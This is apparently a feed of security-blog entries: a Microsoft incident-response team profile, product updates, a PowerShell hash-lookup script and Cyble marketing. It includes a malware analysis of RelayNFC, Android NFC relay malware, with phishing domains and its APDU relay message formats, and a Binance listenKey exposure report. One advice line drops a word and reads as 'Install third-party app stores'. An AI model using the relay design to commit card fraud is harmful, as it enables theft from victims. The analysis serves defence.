pursuit of identity compromise. Threat actors are no longer just exploiting vulnerabilities; they\u2019re weaponizing automation, scaling social engineering, and monetizing stolen access in ways that blur the line between cybercrime and organized business models. In this new paradigm, resilience, global collaboration, and anticipatory defense aren\u2019t optional; they\u2019re survival. Microsoft Digital Defense Report 2025 [1] ranks the largest causes of cyberattacks and prominent trends: Phishing remained the most common initial access method. While there were many changes in the threat landscape, multifactor authentication (MFA) still blocks over 99% of unauthorized access attempts, making it the single most important security measure an organization can implement. While phishing remains a common initial access method, campaigns are moving away from simple phishing as defense approaches evolve. Threat actors increasingly leverage multi-stage attack chains that mix technical exploits and social engineering to gain unauthorized access and maintain persistence. In more than 90% of cases where cyberattacks progressed to the ransom stage, the threat actor had leveraged unmanaged devices in the network. This highlights the impact of gaps in endpoint visibility on threat actor progression. Just as businesses are leveraging generative AI for productivity gains, threat actors are also using AI to augment traditional cyberattacks by automating activities from vulnerability discovery to deepfake content generation. As AI adoption becomes increasingly commonplace, these tools\u2019 access to proprietary and sensitive data has also made AI systems an attractive target for malicious activity. Nation-state actor and ransomware-as-a-service (RaaS) actor activity also evolved, moving away from centralized command-and-control servers and instead leveraging cover, peer-to-peer networks to avoid detection and survive through takedowns by redistributing workloads across participants. Meet some of the DARTians DART members are a diverse and highly skilled team of individuals with the depth of expertise and experience to solve problems quickly. They continually adjust their actions based on what they learn. They can lock down a network, isolate an endpoint, or remove a threat actor before damage is done. CISOs, security teams, and our IR people share this common passion, commitment, and goal - to protect organizations against threats. We recently interviewed several of our team members about how they got into IR work, their most memorable engagements, advice they have for customers, and more. Here are some key highlights from those interviews: How did you get your start? \u201cMy journey began in 2005 when I enlisted in the US Marines and was assigned to the data field, managing servers, routers, and switches, and ensuring the network kept running smoothly. That technical foundation soon led me to a cybersecurity role for the Marine Corps at Quantico, where I first tasted what it meant to defend against real threats. As a Security Operations Center (SOC) analyst, I quickly discovered that cybersecurity is both broad and deep. It opened my eyes to how vulnerabilities are exploited and how a simple oversight can become a major incident.\u201d \u2013 Edwin \u201cMy path into cybersecurity wasn\u2019t exactly a straight line. During the early parts of my career, I worked in business advisory and enterprise sales and was pursuing a path to an MBA from one of the major business schools. While corporate strategy and incident response may feel worlds apart, being able to bridge both has been my tactical advantage in working with our customers to demystify the events that take place in the cyber trenches I now call home.\u201d \u2013 Pru \u201cThe idea of tracking digital adversaries and solving complex puzzles always fascinated me, so when an opportunity arose in 2014 to join a Cyber Warfare unit, I took it. It felt like stepping into a story told in the movies, only the stakes were real, and the learning was relentless.\u201d \u2013 Max Most memorable DART engagement moments \u201cWe quickly gained trusted advisor status and were brought into the investigation. Together, we uncovered internet-facing servers with weak permissions that allowed the threat actor to pivot between on-premises and cloud environments using privileged accounts. In the end, we shut down the threat actor\u2019s access, rebuilt compromised systems, reduced excessive permissions, and delivered a roadmap to strengthen defenses.\u201d \u2013 Adrian Advice for customers \"Nearly every major incident we see starts with compromised identity: weak credentials, stolen passwords, or missed phishing alerts. Enabling multi-factor authentication (MFA) is critical.\u201d \u2013 Max \u201cProactive defense pays off: Tools like Secure Score and strategies such as the tiering model can drastically reduce risk. Don\u2019t wait until an incident to play catch up and try to fortify defenses while also putting out a fire, it is best to act now.\u201d \u2013 Edwin \u201cIt may sound simple or even boring, but over 99% of cyberattacks can be prevented with MFA in place. It\u2019s the digital equivalent of locking your front door and having an alarm system, and it\u2019s easy and inexpensive to implement.\u201d \u2013 Pru \u201cTeamwork is essential: No one succeeds in cybersecurity alone. Collaboration, both within your team and across organizations, is often the deciding factor in a successful response.\u201d \u2013 Adrian \u201cTools powered by AI, like Microsoft Copilot, have become invaluable in helping to quickly analyze suspicious processes, understand command lines, and connect the dots in complex investigations.\u201d \u2013 Max Building a safer digital world, together DART doesn\u2019t just solve technical problems - they help people through some of the most challenging moments of their careers. Every compromise is a puzzle, every engagement a chance to restore trust and build resilience. What drives them isn\u2019t just the scale or complexity of the work - it\u2019s the impact they can make, one incident at a time.

      "title": "RelayNFC: The New NFC Relay Malware Targeting Brazil",
      "summary": "Executive Summary Cyble Research and Intelligence Labs (CRIL) has uncovered an active and evolving phishing campaign targeting users in Brazil. Dubbed RelayNFC, this Android malware family is designed specifically to perform NFC relay attacks for fraudulent contactless payments. RelayNFC is a lightweight yet highly evasive malware because of its Hermes-compiled payload. This makes detection significantly harder, enabling it to stealthily capture victims\u2019 card data and relay it in real time to an attacker-controlled server. Key Takeaways RelayNFC implements a full real-time APDU relay channel, allowing attackers to complete transactions as though the victim\u2019s card were physically present. Distribution relies entirely on phishing, tricking users into downloading RelayNFC malware. The malware is built using React Native and Hermes bytecode, which complicates static analysis and helps evade detection. A related variant attempts to implement Host Card Emulation (HCE), showing that the threat actor is exploring alternate NFC relay techniques. VirusTotal detections remain at zero, indicating very low visibility across the security ecosystem, and the code suggests a high likelihood of continued development. Overview While contactless payments were traditionally viewed as secure, however, this perception has shifted as threat actors are actively exploiting them. Malware strains such as Ngate , SuperCardX , and PhantomCard highlight this accelerating trend. These threats abuse Near-Field Communication (NFC) capabilities to intercept or relay contactless payment data, often delivered through phishing or imposter sites disguised as trusted services. Recently, Cyble Research and Intelligence Labs (CRIL) identified an ongoing campaign distributing a new variant of NFC-based attack malware, which Cyble Research and Intelligence Labs (CRIL) has named \u201cRelayNFC\u201d , derived from the indicators found in its code. The campaign targets users in Brazil and utilises a convincing Portuguese-language page that prompts victims to install an app under the guise of \u201csecuring\u201d their payment cards. The malicious application is designed to capture the victim\u2019s card details and relay them to attackers for fraudulent transactions. We identified five sites with a similar user interface and all distributing the same malicious app, indicating a coordinated and ongoing operation targeting Brazilian users (see Figure 1). hxxps://maisseguraca[.]site/ hxxp://proseguro[.]site/ hxxps://test.ikotech[.]online/ hxxps://maisseguro[.]site/ hxxp://maisprotecao[.]site/ Figure 1 \u2013 Phishing website distributing RelayNFC malware RelayNFC appears to be a newly developed variant built using the React Native framework to facilitate NFC relay fraud. The campaign has been active for at least a month, and the samples currently show zero detections on VirusTotal, highlighting its freshness and potential for widespread misuse. Figure 2 \u2013 Zero detection on VirusTotal A detailed technical analysis of the RelayNFC malware is provided in the next section. Technical Analysis RelayNFC is designed to operate with minimal permissions and components as indicated in its manifest file (see Figure 3). Figure 3 \u2013 Manifest file content The RelayNFC malware is developed using the React Native framework, which means that much of its functionality is packaged within the index.android.bundle file rather than traditional Java or Kotlin source code. Instead of storing readable JavaScript, this bundle is compiled using the Hermes JavaScript engine, resulting in Hermes bytecode. This bytecode format makes it significantly harder to analyse and obfuscates the underlying logic, making static inspection challenging. Reader Role RelayNFC operates as a \u2018reader\u2019, enabling the malware to capture the victim\u2019s card data and relay it to the attacker\u2019s server. After installation, the app immediately displays a phishing screen that instructs the user to tap their payment card on the device, as shown in the figure below (see Figure 4). Figure 4 \u2013 Malware prompting the user to bring the card closer Once the card data is read, RelayNFC presents another phishing screen prompting the victim to enter their 4- or 6-digit PIN. This behaviour is reflected in the code extracted from the index.android.bundle file (see Figure 5). Figure 5 \u2013 PIN Phishing activity inside index.android.bundle file The RelayNFC code is built around a real-time relay channel that connects the victim\u2019s smartphone to the attacker\u2019s command server. This channel utilizes a persistent WebSocket connection to forward APDU (Application Protocol Data Unit - Communication unit between a card reader and a card) commands between the attacker and the victim\u2019s NFC subsystem, effectively turning the infected device into a remote NFC \u201creader\u201d for the attacker. Once the WebSocket connects, the malware immediately sends an identification packet: { \"type\": \"hello\", \"role\": \"reader\", \"id\": \" \" } Here, the \"role\": \"reader\" is critical \u2014 the attacker expects this device to act as the APDU source, meaning the side that communicates with the physical NFC card (see Figure 6). Figure 6 \u2013 Establishing WebSocket connection After the WebSocket connection is active, RelayNFC listens for incoming messages from the server. It supports two main message types: a ping-pong exchange to maintain the session, and APDU commands that drive the card-reading and relaying process (see Figure 7). Figure 7 \u2013 Message type received from the server When the attacker initiates a transaction from their POS-emulator device, the C&C server sends a specially crafted message of type \"apdu\" to the infected phone. This message contains a unique request ID, a session identifier, and the APDU command encoded as a hexadecimal string. { \"type\": \"apdu\", \"id\": 1, \"sessionId\": \"abc\", \"data\": \"00A40400\" } Upon receiving this instruction, RelayNFC parses the packet, extracts the APDU data, and forwards it directly to the victim device\u2019s NFC subsystem, effectively acting as a remote interface to the physical payment card. The NFC controller processes the command and generates a genuine APDU response exactly as the card would during a legitimate transaction. RelayNFC captures this output and immediately returns it to the C&C in an \"apdu-resp\" message, preserving the original request ID and session ID so the attacker\u2019s device can continue the EMV transaction seamlessly. { \"type\": \"apdu-resp\", \"id\": 1, \"sessionId\": \"abc\", \"data\": \"9000\" } This real-time, bidirectional relay of APDU commands and responses is what enables the attacker to execute a full payment flow remotely, as if the victim\u2019s card were physically present at their POS terminal. Host-based Card Emulation Relay During our analysis of the campaign, we identified an additional phishing site, hxxps://test.ikotech[.]online, which uses a similar interface and distributes a malicious APK named \u201ccartao-seguro.apk\u201d (SHA-256: 5905aa58853a05e860c87e9feeeea7c32b43859c8e703485e233429cec8d38dc). This application includes a component called RelayHostApduService, which extends Android\u2019s HostApduService and implements Host-based Card Emulation (HCE). Figure 8 \u2013 HCE implementation HCE allows an Android device to emulate a payment card and exchange small amounts of data over NFC. The malware overrides the processCommandApdu method and uses a WebSocket channel to forward APDU commands and responses externally. This mechanism effectively enables a real-time NFC relay attack, allowing a victim\u2019s card interactions to be relayed between a legitimate payment terminal and an attacker-controlled device. Figure 9 \u2013 HCE Relay Implementation A similar pattern was recently observed in the NGate malware analysed by CERT.PL . Although the malware includes HCE-related code, the threat actors did not register the HCE service in the manifest, rendering it non-functional. This suggests the malware is still under development and that the operators are experimenting with different NFC relay attack techniques. Conclusion The RelayNFC campaign highlights the rapid evolution of NFC relay malware targeting payment systems, particularly in Brazil. By combining phishing-driven distribution, React Native\u2013based obfuscation, and real-time APDU relaying over WebSockets, the threat actors have created a highly effective mechanism for remote EMV transaction fraud. The discovery of a secondary variant attempting to implement HCE-based card emulation further indicates ongoing experimentation and active development within this malware family. As mobile and contactless payments continue to grow in adoption and become increasingly digitized, the BFSI sector\u2019s attack surface also expands proportionately. This emphasizes the need for stronger device-level protections, user awareness, and enhanced monitoring by financial institutions. Cyble's Threat Intelligence Platforms continuously monitor emerging threats, infrastructure, and activity across the dark web , deep web , and open sources. This proactive intelligence empowers organizations with early detection, impersonation, infrastructure mapping, and attribution insights. Altogether, these capabilities provide a critical head start in mitigating and responding to evolving cyber threats . Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below: Install Apps Only from Trusted Sources: Download apps exclusively from official platforms, such as the Google Play Store . Install third-party app stores or links received via SMS, social media, or email. Be Cautious with Permissions and installs: Never grant permissions and install an application unless you're certain of an app's legitimacy. Watch for imposter Pages: Always verify the URL and avoid suspicious links and websites that ask for sensitive information. Enable Multi-Factor Authentication (MFA): Use MFA for banking and financial apps to add an extra layer of protection, even if credentials are compromised. Report Suspicious Activity: If you suspect you've been targeted or infected, report the incident to your bank and local authorities immediately. If necessary, reset your credentials and perform a factory reset. Use Mobile Security Solutions: Install a mobile security application that includes real-time scanning. Keep Your Device Updated: Ensure your Android OS and apps are updated regularly. Security patches often address vulnerabilities that malware exploits. Disable Tap-to-Pay / NFC When Not in Use Keep NFC turned off on your device unless actively making a payment. This prevents unauthorised NFC access and reduces exposure to relay-based attacks.

      "summary": "Overview Azure Bastion provides secure RDP and SSH access to Azure virtual machines directly via the Azure portal or via the native SSH/RDP client already installed on your local computer. Previously, Bastion supported Entra ID authentication (formerly AAD) for RDP and SSH connections via native client and for SSH connections via the portal. Today, we are introducing public preview for Entra ID support for RDP connections in the portal, delivering a more seamless and secure experience for users. Why Entra ID authentication? When Bastion users connect to Windows VMs through the portal, they authenticate using either a VM password or a password stored in Azure Key Vault. By leveraging Microsoft Entra ID , authentication becomes identity-based, eliminating the need for local credentials and reducing complexity. This approach provides a seamless, one-click sign-in experience, making it easier for users to access their Windows VMs without managing separate passwords. Beyond convenience, Entra ID strengthens organizational security by centralizing identity management and enforcing robust access controls. The result is a simplified, secure, and user-friendly way to connect to virtual machines while improving the overall security posture. Getting Started in Azure Portal Prerequisites: Ensure that the user connecting either has Virtual Machine User Login OR Virtual Machine Administrator Login role on the virtual machine Ensure that AADLoginForWindows extension is enabled on the VM. Microsoft Entra ID Login can be enabled during VM creation by checking the box for Login with Microsoft Entra ID or by adding the AADLogin extension to a pre-existing VM. Steps: Navigate to your Virtual Machine resource in the Azure portal. Select Bastion under Connect. Check that Microsoft Entra ID is the Authentication Type. Click Connect. Next Steps Try Entra ID authentication support today, now in public preview - and share your feedback with the team. Learn more about Bastion support for Entra ID authentication here and keep up to date with all things Azure Bastion in our What's New page.",

      "summary": "Hi all, I\u2019ve published a technical case study analyzing a design issue in how the Binance API enforces IP whitelisting. This is not about account takeover or fund theft \u2014 it\u2019s about a trust-boundary mismatch between the API key and the secondary listenKey used for WebSocket streams. Summary of the issue A listenKey can be created using only the API key (no secret, no signature). The API key is protected by IP whitelisting. The listenKey is not protected by IP whitelisting. Once a listenKey leaks anywhere in the toolchain \u2014 debug logs, third-party libraries, bots, browser extensions, supply-chain modules \u2014 it can be reused from any IP address. This exposes real-time trading activity , balances, open orders, leverage changes, stop levels, liquidation events and more. This is not a direct account compromise. It\u2019s market-intelligence leakage , which can be extremely valuable when aggregated across many users or bot frameworks. Why this matters Many users rely on IP whitelisting as their final defensive barrier. The listenKey silently bypasses that assumption. This creates a false sense of security and enables unexpected data exposure patterns that users are not aware of. Disclosure process I responsibly reported this and waited ~11 months.

      "title": "Strengthening calendar security through enhanced remediation",
      "summary": "In today\u2019s evolving threat landscape, phishing attacks are becoming increasingly sophisticated, often leveraging meeting invites to bypass traditional defenses. While Security Operations (SOC) teams rely on Microsoft Defender\u2019s remediation actions to remove malicious emails, a hidden risk persists: calendar entries created by Outlook during email delivery. These entries can remain active even after the email is deleted, leaving users exposed to harmful content. This update addresses that gap. Remediation supports cleaning up calendar entries SOC teams currently use remediation actions such as Move to Junk , Delete , Soft Delete , and Hard Delete to quickly eliminate email threats from user inboxes. However, meeting invite emails introduce an additional challenge. Even after the email is removed, Outlook automatically creates a calendar entry during delivery, which remains accessible to users. For example, consider a phishing email sent as a meeting invite. Despite the admin removing the email from the user\u2019s inbox, the user can still interact with the same malicious content via the calendar entry. This residual entry may contain harmful links or phishing content, creating a security gap. With this update, we\u2019re taking the first step toward closing that gap. Hard Delete will now also remove the associated calendar entry for any meeting invite email. This ensures threats are fully eradicated\u2014not just from the inbox but also from the calendar\u2014reducing the risk of user interaction with malicious content. This change applies to Hard Delete actions taken from any surface, including Explorer, Advanced Hunting, and API. Note : 1) Deleted calendar entries can be restored by resending the meeting invite. 2) This action does not remove calendar entries manually added by users via .ics files. Ability to Block URL domains via submission/TABL actions from Explorer SOC teams can currently add senders and URLs to the TABL block list when submitting false negatives to Microsoft. However, phishing campaigns often use variations of URLs under the same parent domain, making full URL blocking less effective. With this update, TABL options for URL domains are now dynamically surfaced, enabling SOC teams to block entire domains without leaving their workflow. This enhancement simplifies remediation and strengthens defenses against domain-based phishing attacks. These updates strengthen SOC remediation workflows by closing critical security gaps and ensuring threats are fully neutralized across all user touchpoints. By extending remediation to calendar entries and enabling domain-level URL blocking, we deliver comprehensive protection that reduces risk, streamlines operations, and safeguards user experiences. At Microsoft, our priority is your security, and we remain committed to empowering SOC teams with tools that make defense smarter and more effective.

      "title": "Using the Microsoft Defender for Endpoint Files API to Validate Malware Hashes",
      "summary": "Introduction Security advisories frequently include file hashes (SHA-1 or SHA-256) as indicators of compromise (IoCs). Microsoft Defender for Endpoint (MDE) exposes a Files API that lets SecOps quickly look up Microsoft\u2019s verdict and metadata for a given hash. This enables rapid assessment\u2014whether a file is classified as Malicious, Suspicious, Clean, or Unknown\u2014and helps analysts decide the next response action without needing to download or execute the sample. What is the Files API in MDE and why is it used in Security Operations? The Files API is part of the Defender for Endpoint REST APIs that returns a file profile by hash identifier. Analysts use it to: \u2022 Validate whether Microsoft has a global verdict for a hash named in an advisory. \u2022 Retrieve telemetry such as global prevalence and first/last observed times to gauge risk and spread. \u2022 Pivot to related alerts and devices when needed. This lookup shortens triage time and avoids unnecessary handling of potentially dangerous samples. Prerequisites To call the Files API using application (client credentials) context, you need: A Microsoft Entra ID App Registration (Web app / service). API permissions on the WindowsDefenderATP resource (Microsoft Defender for Endpoint). Minimum: File.Read.All (Application). Admin consent granted for the permissions. Network access to the MDE API endpoint (region-based base URL) and the Microsoft identity platform (OAuth 2.0). Tip: For interactive testing, you can also use the API Explorer in the Microsoft Defender portal under Partners & APIs, which runs requests under your user context and RBAC scope. How to use the Files API via PowerShell 1) Acquire an OAuth token from the Microsoft identity platform using your app\u2019s client ID and secret with the .default scope for the Defender API. 2) Send an HTTP GET request to the Files endpoint with the hash (SHA-1 or SHA-256) as the identifier. 3) Inspect the JSON response field \"fileClassification\" and other metadata (globalPrevalence, first/last observed). 4) Use the verdict to decide next actions (e.g., create an Indicator to block, hunt in Advanced Hunting, or open related alerts). Actual Script ===== STEP 1: Get OAuth Token (MDE v1) ===== $tenantId = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" $appId = \"xxxxxxxxxxxxxxxxxxxxxxxxxxx\" $appSecret = \"xxxxxxxxxxxxxxxxxxxxxxxxxxx\" # update with your tenant and app values $tokenUri = \"https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token\" $body = @{ client_id = $appId scope = \"https://api.securitycenter.microsoft.com/.default\" client_secret = $appSecret grant_type = \"client_credentials\" } $tokenResponse = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType \"application/x-www-form-urlencoded\" $token = $tokenResponse.access_token # ===== STEP 2: Call MDE v1 Files API ===== $hash = \"97bf5e1a903a978b2281496e0a897688e9d8e6f981238cf91e39bae20390defe\" # Replace with your actual hash values. $uri = \"https://api.securitycenter.microsoft.com/api/v1.0/files/$hash\" try { $response = Invoke-RestMethod -Uri $uri -Headers @{ Authorization = \"Bearer $token\" Accept = \"application/json\" } -Method Get } catch { Write-Error \"API call failed: $($_.Exception.Message)\" if ($_.ErrorDetails.Message) { Write-Host $_.ErrorDetails.Message } return } switch ($response.fileClassification) { \"Malicious\" { Write-Host \"MDE recognises this hash as MALICIOUS. Threat Name: $($response.threatName)\" -ForegroundColor Red } \"Suspicious\" { Write-Host \"MDE recognises this hash as SUSPICIOUS.\" -ForegroundColor Yellow } \"Clean\" { Write-Host \"MDE recognises this hash as CLEAN.\" -ForegroundColor Green } default { Write-Host \"MDE does NOT have a signature for this hash (Unknown).\" -ForegroundColor Gray } } $response | ConvertTo-Json -Depth 5 Script Explanation Token acquisition: Uses OAuth 2.0 client credentials flow to obtain an access token; scope targets Defender for Endpoint API. Endpoint call: Builds a GET request to the Files endpoint with the hash identifier. Error handling: Catches HTTP errors and prints server-provided details if available. Verdict mapping: Reads the fileClassification field and prints a color-coded verdict (Malicious, Suspicious, Clean, Unknown). Response output: Prints the full JSON for deeper analysis and logging. Recommended Inputs The Files endpoint accepts SHA-1 or SHA-256 identifiers; ensure you pass the correct hash type. Consider using certificate credentials or managed identity instead of client secrets for production automation. Sample Output API Explorer - Other Option to query File API The Microsoft Defender for Endpoint API Explorer is a tool that helps you explore various Defender for Endpoint APIs interactively. The API Explorer makes it easy to construct and do API queries, test, and send requests for any available Defender for Endpoint API endpoint. Use the API Explorer to take actions or find data that might not yet be available through the user interface. The tool is useful during app development. It allows you to perform API queries that respect your user access settings, reducing the need to generate access tokens. You can also use the tool to explore the gallery of sample queries, copy result code samples, and generate debug information. With the API Explorer, you can: Run requests for any method and see responses in real-time. Quickly browse through the API samples and learn what parameters they support. Make API calls with ease; no need to authenticate beyond the management portal signin. Access API Explorer From the left navigation menu, select Partners & APIs > API Explorer . Supported APIs API Explorer supports all the APIs offered by Defender for Endpoint. The list of supported APIs is available in the APIs documentation . Get started with the API Explorer In the left pane, there's a list of sample requests that you can use. Follow the links and click Run query . Some of the samples may require specifying a parameter in the URL, for example, {File Hash}. Permissions Required You need to log in with an account that has appropriate RBAC roles in Microsoft Defender for Endpoint. API Explorer enforces the same role-based access control (RBAC) as the portal: Security Administrator or Global Administrator for high-privilege actions (e.g., offboarding a device, submitting indicators). Lower roles (e.g., Security Reader) can only run read-only queries like Get file information or Get alerts. No additional API permissions or app registration are needed because requests run under your user context . Conclusion The MDE Files API gives SecOps an immediate way to validate hashes from advisories and threat feeds, reducing time-to-triage and enabling consistent response. When a hash is classified as Malicious or Suspicious, teams can move directly to containment (e.g., creating an Indicator to block). When it is Clean or Unknown, analysts can pivot to hunting, sandboxing, or further intelligence before acting. Integrating this lookup into runbooks helps security operations quickly and safely respond to emerging threats.

      "title": "How Cyble is Empowering European Enterprises with AI-Powered Threat Intelligence",
      "summary": "Europe threat landscape 2025 \" data-image-caption=\"\" data-medium-file=\"https://cyble.com/wp-content/uploads/2025/11/Europe-threat-landscape-2025-300x150.webp\" data-large-file=\"https://cyble.com/wp-content/uploads/2025/11/Europe-threat-landscape-2025-1024x512.webp\" title=\"How Cyble is Empowering European Enterprises with AI-Powered Threat Intelligence 3\"> We have heard experts and analysts say the European cyber threat landscape has reached a tipping point and is no longer merely evolving. What makes them say that? Does it really hold true, or is it just to create a buzz? Here\u2019s proof of it. The threat landscape exploded in the first three quarters of 2025 alone, including 1,126 data breaches and leaks, 955 ransomware attacks, and 644 incidents involving the sale of compromised access across the continent. From BFSI and government to retail and energy, every critical sector faces an unparalleled convergence of highly sophisticated ransomware operations, state-sponsored attacks, and ideologically driven hacktivism. European enterprises need more than traditional defenses, as regulations such as NIS2, GDPR, and DORA demand an even higher and proactive security posture. They want intelligence-driven, predictive security capabilities that can anticipate threats before they ever materialize. That's where Cyble steps in. As the AI-native threat intelligence pioneer, we're fundamentally changing how European organizations detect, understand, and neutralize cyber threats across the deep, dark, and surface web. The European Threat Paradox Europe's cybersecurity problem is not just about the number of attacks but about their surgical sophistication and strategic targeting. Our own research from January to September 2025 exposed a shocking power shift in the criminal underworld, where aggressive new players like Qilin (131 attacks) and Akira (124 attacks) have trumped legacy actors like LockBit. Figure 1: Most Active Ransomware Actors in Europe and UK In fact, these two groups, along with SafePay, contributed over 36% of the 955 ransomware attacks seen across Europe and the UK. The sheer volume of attacks means the top five most active ransomware groups were responsible for nearly half-47% of the total incidents. Geographically, this impact is highly concentrated, with the lion's share of ransomware campaigns during this period falling on Germany with 211 attacks, the United Kingdom with 159, and Italy with 118. Figure 2: Most Targeted Countries by Ransomware Actors Consider the threat environment in Europe to be a three-front war. First, there are the commoditized attack campaigns. Cybercriminals taking advantage of the initial access market, with 644 compromised accesses put up for sale. This is disproportionately hitting the Retail sector, making up a massive 41% of all observed initial access sales\u2014a clear indication that this is the path of least resistance to payment card and customer data for criminals. Figure 3: Compromised Accesses Across Industries in Europe and UK Secondly, state-sponsored actors are intensifying espionage operations. Thirdly, geopolitically motivated hacktivism, perpetuated by groups such as Z-ALLIANCE and NoName057(16), continues apace with a relentless barrage of DDoS attacks against government and critical infrastructure targets. This perfect storm of threat actors is exploiting Europe's regulatory complexity and the differing security maturity across member states, creating a fragmented defense that sophisticated adversaries exploit with surgical precision. Why Traditional Threat Intelligence Falls Short Traditional security solutions fundamentally do not match up to the threat environment of today. Legacy Threat Intelligence platforms operate in a reactive manner based on known signatures and static IoCs. They are tailored for yesterday's threats, not tomorrow's attacks. Consider the challenge a European financial institution has to navigate in maintaining DORA compliance while defending against state-sponsored advanced persistent threats. Traditional security tools generate overwhelming alert volumes \u2013 thousands of notifications daily. Security teams literally drown in false positives, wasting critical resources investigating benign anomalies, while genuine, novel threats slip through undetected because they fail to match an existing signature. The divide between threat detection and threat understanding has never been wider. What organizations require is contextual intelligence to answer some fundamental questions. Who is targeting us? What motivates them? What tactics, techniques, and procedures do they use? How do we prioritize response when there are multiple incidents at any one time? This is where AI-powered threat intelligence becomes not just beneficial, but essential. The AI-Native Approach at Cyble: Intelligence That Predicts, Not Just Detects At Cyble, the concept of threat intelligence has been reinvented for the AI age. We did not adapt some outdated systems to include artificial intelligence; we created our entire platform, Cyble Vision , natively as AI from its inception. It is a foundational difference that delivers capabilities that no legacy approach can match. At the core of Cyble's platform is Blaze AI , an agentic cybersecurity engine designed to hunt, reason, and respond to threats autonomously in real time. Unlike other reactive systems, Blaze AI is designed to look ahead, predicting attacks as far as months in advance by analyzing billions of behavioral patterns and data points. The platform culls over 15 billion pages daily across dark web forums , cybercrime marketplaces, paste sites, and social media channels\u2014creating the unparalleled, real-time view of emerging threats before they ever reach your production environments. This predictive capability is nothing short of revolutionary for European enterprises. Instead of finding out that you have been breached weeks after an initial compromise, you get early warning intelligence the very moment your credentials appear on dark web marketplaces , threat actors discuss targeting your industry vertical, or there are vulnerabilities affecting your technology stack that are being actively weaponized. Cyble Vision delivers more than 50 use cases integrated onto one platform that provides threat intelligence, digital risk protection, dark web monitoring , automated takedowns , and endpoint security all in one place. This consolidation removes the feared security tool sprawl that many European organizations face, where various systems introduce blind spots and integration nightmares. If you are a European enterprise and want to see how Cyble can help you build cyber resilience and support your compliance game, book a demo with us now! Purpose-built Solutions for Europe What European enterprises need is not just threat intelligence, but compliance-adhering intelligence that meets stringent regulatory requirements. That is the reality that Cyble\u2019s platform addresses. NIS2 demands essential and important entities to adopt a stringent security framework along with collaborative threat sharing. Cyble Vision helps to achieve this with automated incident detection, comprehensive threat reporting, and evidence collection that streamline regulatory notification requirements. When organizations must report significant incidents within 24 hours under the auspices of NIS2, AI-powered intelligence that instantly contextualizes attacks becomes invaluable. Cyble brings to financial institutions the continuous threat monitoring and third-party risk visibility that regulators want them to have, especially in meeting DORA's operational resilience requirements. Its attack surface management capabilities identify exposed assets, misconfigured cloud resources, and supply chain vulnerabilities-the exact points assessed by DORA stress testing and threat-led penetration testing. With Cyble's dark web monitoring through AmIBreached, GDPR compliance takes on all-new dimensions. It allows organizations to proactively discover if customer data has been compromised and appeared in breach databases for rapid responses before regulatory reporting deadlines expire. This proactive posture transforms GDPR from a reactive compliance burden into a strategic security advantage. Real-World Impact The real-world difference between theoretical capability and a tangible impact is clear in our deployments. Cyble's customer base spans over 500 organizations, including Fortune 50 companies and government entities across Europe, all demonstrating measurable security improvements. Consider a European manufacturing company. For adversaries, manufacturing is a prime high-value target; in the first nine months of 2025, it accounted for 109 ransomware attacks. It was one of the top three most targeted sectors by ransomware groups, just behind Professional Services with 119 attacks and Construction with 111 attacks. Figure 4: Most targeted sectors in Europe and the UK by ransomware Traditional security tools may trigger alerts related to suspicious network traffic only after the attackers have already gained persistence. However, Cyble Vision monitors dark web forums and notices when initial access brokers are advertising network access specifically to the manufacturers in that company's region. Security teams will receive actionable intelligence about the threat weeks ahead of an actual attack attempt and can take proactive means to harden their defenses. Organizations concerned about data loss? The most sensitive information sectors, namely BFSI, Government & Law Enforcement, and Retail, contributed to more than 31% of all 1,126 data breach and leak incidents observed. Dark web monitoring by Cyble can proactively find out whether customer data has been compromised and appeared in breach databases, thus enabling rapid response before regulatory reporting deadlines expire. The public sector also benefits from the services of Cyble Hawk , an AI-driven investigation platform for law enforcement agencies and government entities. Hawk's current capacity allows for proactive threat actor identification, attack attribution to threat actor groups, and effective intelligence sharing between European security agencies. The Competitive Edge of Cyble Being consistently recognized among the top cyber threat intelligence platforms globally is not just a plaque on the wall; it is a reflection of real technical differentiation. Industry analyst acknowledgement from Gartner and Forrester validates what our customers experience; more accurate threat detection, faster incident response, and genuinely actionable intelligence. Several factors differentiate Cyble in the crowded European cybersecurity market: Comprehensive Coverage: Most of the competitors focus on a particular threat vector, whereas Cyble offers unified visibility across adversaries, infrastructure, exposures, weaknesses, and targets. This, in turn, eliminates blind spots. AI-Driven Prioritization: The platform does not merely amass alerts; it filters out all the noise and only delivers critical, actionable intelligence. For European security teams overwhelmed by alert fatigue, this gives them clarity and focus. Global Research Capabilities: With CRIL (Cyble Research and Intelligence Labs), the company creates niche threat reports such as the Europe & UK Threat Landscape Report 2025 \u2013 providing the regional intelligence that generic global platforms inevitably miss. Speed to Insight: With ransomware groups deploying attacks in a matter of hours, having a response time measured in days is simply unacceptable. Cyble's AI-driven automation enables response times measured in minutes. The Future of European Cyber Defense Confronted by an increasingly hostile threat landscape and complex regulatory requirements, the organizations that will thrive in Europe are those embracing AI-powered, intelligence-led security strategies. From its recent launch of Cyble Titan endpoint security to ongoing AI capability enhancements, innovation at Cyble continues apace. With offices established across Europe and the UK, Cyble brings global expertise adapted to regional realities that puts the company in place as a strategic partner for European digital transformation. For European enterprises, the question is no longer if, but how fast they can adopt AI-powered threat intelligence. When adversaries are moving at machine speed, it is a losing proposition to try to defend at human speed. What European organizations need most is the ability to see threats before they strike, understand adversaries before they attack, and defend with the intelligence that turns reactive security into predictive protection. In today's world, where cyber threats evolve much faster than traditional defenses can adapt, it is Cyble's AI-native platform that provides the predictive intelligence and automated response capabilities required by enterprises in Europe to secure their digital future.

